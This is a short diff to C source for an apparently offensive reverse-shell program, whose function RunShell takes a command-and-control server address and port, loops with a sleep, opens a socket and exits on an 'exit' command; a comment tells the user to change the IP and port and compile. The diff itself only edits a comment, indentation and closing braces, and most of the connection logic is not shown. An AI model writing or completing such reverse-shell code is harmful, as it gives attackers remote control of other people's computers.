@@ -8,7 +8,7 @@
 
 void RunShell(char* C2Server, int C2Port) {
 	while(true) {
-        	Sleep(5000);    // Five Second
+       		Sleep(5000);
 
 	        SOCKET mySocket;
         	sockaddr_in addr;
@@ -57,12 +57,10 @@ void RunShell(char* C2Server, int C2Port) {
         	        if (strcmp(RecvData, "exit\n") == 0) {
                 	    exit(0);
 	                }
-	            }
-	        }
-	    }
+		    }
+		}
 	}
-
-
+}
 
 int runExt(void) {
 	// Change IP address and port and compile with:
